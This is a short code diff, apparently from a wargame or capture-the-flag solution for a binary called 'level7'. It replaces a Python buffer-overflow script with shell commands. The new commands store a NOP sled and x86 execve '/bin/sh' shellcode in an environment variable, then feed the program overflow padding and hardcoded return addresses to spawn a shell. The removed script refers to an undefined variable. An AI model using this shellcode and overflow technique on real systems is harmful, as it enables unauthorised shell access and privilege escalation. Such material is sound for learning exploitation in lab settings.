@@ -1,6 +1,5 @@
-import struct
 
-m_address = struct.pack("I", 0x80484f4)
-to_replace = struct.pack("I", 0x8049928)
-padding = "AAAABBBBCCCCDDDDEEEE"+ to_replace + "GGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" + " "+ m_address
-print padding + target_address
+export  SHELLCODE=$(python -c 'print "\x90"*400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+
+
+cat | ./level7 $(python -c 'print "AAAABBBBCCCCDDDDEEEE" + "\x08\x04\x99\x34"[::-1]') $(python -c 'print "\xbf\xff\xf8\x30"[::-1]')
